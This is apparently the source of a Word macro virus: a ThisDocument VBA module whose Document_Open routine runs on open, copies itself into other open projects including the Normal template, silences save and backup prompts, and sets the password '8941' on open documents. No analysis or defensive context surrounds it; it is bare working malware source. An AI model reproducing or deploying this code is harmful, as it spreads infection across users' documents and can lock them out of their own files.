   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   'Copy itself to the existed documents and add password
   Private Sub Document_Open()
   On Error Resume Next
   Dim i, j, k As Integer
   Dim b, l As Integer

   j = -1
   For i = 1 To Application.VBE.VBProjects.Count
       If Application.VBE.VBProjects(i).Name = "Normal" Then
           j = i
       End If
       If Not Application.VBE.VBProjects(i).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000) Then
               If j > 0 Then
                   If Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Find("Document_Open", 1, 1, 1000, 1000) = True Then
                       b = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                       l = Application.VBE.VBProjects(j).VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                       Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Application.VBE.VBProjects(j).VBComponents(1).CodeModule.Lines(b, b + l)
                   Else
                       b = Me.VBProject.VBComponents(1).CodeModule.ProcStartLine("Document_Open", vbext_pk_Proc)
                       l = Me.VBProject.VBComponents(1).CodeModule.ProcCountLines("Document_Open", vbext_pk_Proc)
                       Application.VBE.VBProjects(i).VBComponents(1).CodeModule.AddFromString Me.VBProject.VBComponents(1).CodeModule.Lines(b, b + l)
                   End If
              End If
       End If


               Options.AllowFastSave = True
               Options.BackgroundSave = True
               Options.CreateBackup = False
               Options.SavePropertiesPrompt = False
               Options.SaveNormalPrompt = False
               Application.Documents(i).Password = "8941"
   '            Application.Documents(i).Save

   Next i


   End Sub
